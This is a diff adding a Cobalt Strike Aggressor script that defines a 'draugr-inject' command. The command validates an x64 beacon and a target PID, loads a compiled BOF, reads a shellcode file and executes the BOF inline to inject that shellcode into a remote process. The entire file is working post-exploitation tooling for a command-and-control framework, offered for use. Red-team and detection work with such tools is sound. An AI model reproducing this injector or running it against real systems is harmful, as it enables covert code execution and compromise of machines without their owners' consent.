@@ -1,0 +1,51 @@
+alias draugr-inject {
+    if(size(@_) != 3)
+    {
+        berror($1, "Incorrect usage!");
+        return;
+    }
+
+    local('$barch $handle $data $args');
+    
+    # Get beacon architecture
+    $barch = barch($1);
+
+    # Ensure we are in an x64 beacon
+    if ($barch !eq 'x64') {
+        berror($1, "We just support x64 at the moment.");
+        return;
+    }
+
+    # Verify PID is an integer
+    # Conditional taken from: https://github.com/connormcgarr/cThreadHijack/blob/main/cThreadHijack.cna
+    if ((!-isnumber $2) || (int($2) <= 0))
+    {
+        berror($1, "Please enter a valid PID");
+        return;
+    }
+
+    # Load BOF
+    $handle = openf(script_resource("bin/draugr-strike.o"));
+    $data = readb($handle, -1);
+    closef($handle);
+
+    # Check if supplied file exists
+    if (!-exists $3) {
+        berror($1, "File doesn't exist");
+        return;
+    }
+
+
+    # Read shellcode from bin
+    local('$sc_handle $sc_data');
+    $sc_handle = openf($3);
+    $sc_data = readb($sc_handle, -1);
+    closef($sc_handle);
+
+    # Pack args
+    $args = bof_pack($1,"ib", $2, $sc_data);
+    
+    btask($1, "Remote process inject by @RtlDallas");
+
+    beacon_inline_execute($1, $data, "go", $args);
+}
